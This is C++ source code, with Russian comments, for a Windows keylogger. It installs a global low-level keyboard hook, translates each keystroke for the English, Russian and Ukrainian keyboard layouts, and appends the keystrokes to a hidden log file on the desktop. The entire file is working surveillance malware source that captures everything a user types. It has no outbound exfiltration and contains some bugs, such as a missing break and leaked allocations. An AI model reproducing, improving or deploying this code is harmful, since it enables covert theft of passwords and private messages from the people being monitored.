#include <Windows.h>
#include <Winuser.h> //всё, кроме WinMain держится на этом
#include <malloc.h>
#include <locale.h>
#include <string.h>
#include <string>
#include <stdio.h>

#define SIZE_STR 1 << 8
#define PATH L"C:\\Users\\Imper\\Desktop\\log.txt"
#define RUS 0x0419
#define ENG 0x0409
#define UKR 0x0FFFFF0A8

OVERLAPPED olf = { 0 };
LARGE_INTEGER li = { 0 };

bool IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(std::wstring* wstr);

int CALLBACK wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	if (HANDLE hfile = CreateFile(PATH, GENERIC_READ, FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, nullptr); hfile == INVALID_HANDLE_VALUE)
	{
		GetFileSizeEx(hfile, &li);
		++li.QuadPart;
	}
	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		LogKey, NULL, NULL);

	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hHook);

	return 0;
}

bool IsCaps(void)
{
	//GetKeyState используеться в основном для определения состояния нажатия системной кнопки
	//VK - Virtual Key
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return true;
	return false;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5)) // 32
			iKey |= 0x1 << 24; //Задаём истину для 24 бита
		LPWSTR wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameText(iKey, wstr, SIZE_STR);

		if (iKey)
		if (IsCaps())
		{
			std::wstring* wstr1;
			switch (wstr[0])
			{
				case '1':
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"!") + std::wstring(L"]"));
					WriteToFile(wstr1);
					break;
				case '2':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"@") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"\"") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '3':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"#") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"№") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '4':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"$") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L";") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '5':
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"%") + std::wstring(L"]"));
					WriteToFile(wstr1);
					break;
				case '6':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"^") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L":") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
				case '7':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"&") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"?") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '8':
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"*") + std::wstring(L"]"));
					WriteToFile(wstr1);
					break;
				case '9':
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"(") + std::wstring(L"]"));
					WriteToFile(wstr1);
					break;
				case '0':
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L")") + std::wstring(L"]"));
					WriteToFile(wstr1);
					break;
				case '-':
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"_") + std::wstring(L"]"));
					WriteToFile(wstr1);
					break;
				case '=':
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"+") + std::wstring(L"]"));
					WriteToFile(wstr1);
					break;
				case '[':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"{") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Х") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case ']':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"}") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ъ") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ї") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case ';':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L":") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ж") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '\'':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"\"") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ж") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case ',':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"<") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Б") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '.':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L">") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ю") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '/':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"?") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L",") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '\\':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"|") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"/") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				case '`':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"~") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					else if (LOWORD(GetKeyboardLayout(0)) == RUS || LOWORD(GetKeyboardLayout(0)) == UKR)
					{
						wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(L"Ё") + std::wstring(L"]"));
						WriteToFile(wstr1);
					}
					break;
				default:
				{
					wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(wstr) + std::wstring(L"]"));
					WriteToFile(wstr1);
				}
					break;
			}
		}
		else
		{
			std::wstring* wstr1 = new std::wstring(std::wstring(L"[") + std::wstring(wstr) + std::wstring(L"]"));
			for (size_t i = 1; i < wstr1->size() - 1; ++i)
			{
				wstr1[0][i] = std::tolower(wstr1[0][i]);
			}
			WriteToFile(wstr1);
			wstr1->~basic_string();
		}

		free(wstr);//!!!!
	}
	return CallNextHookEx(nullptr, iCode, wParam, lParam);
}

VOID WriteToFile(std::wstring* wstr)
{
	HANDLE hWrite = CreateFile(
		PATH,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		nullptr,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN,
		nullptr);
	olf.Offset = li.LowPart;
	olf.OffsetHigh = li.HighPart;

	DWORD iWrited = 0;
	if (hWrite)
		WriteFile(hWrite, wstr->c_str(), wstr->size() * 2, &iWrited, &olf);

	li.QuadPart += iWrited;

	CloseHandle(hWrite);
}
